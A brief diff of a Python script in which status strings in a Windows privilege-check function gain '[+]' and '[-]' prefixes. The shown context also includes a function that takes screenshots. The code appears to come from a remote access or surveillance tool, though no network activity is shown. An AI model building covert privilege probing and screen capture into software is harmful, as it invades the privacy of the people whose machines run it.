@@ -28,9 +28,9 @@ def is_admin():
     try:
         temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'), 'temp']))
     except:
-        admin="User Privilages"
+        admin="[-]User Privilages"
     else:
-        admin="Admin Privilages"
+        admin="[+]Admin Privilages"
 def screenshot():
     with mss() as screenshot:
         screenshot.shot(output="monitor-1.png")
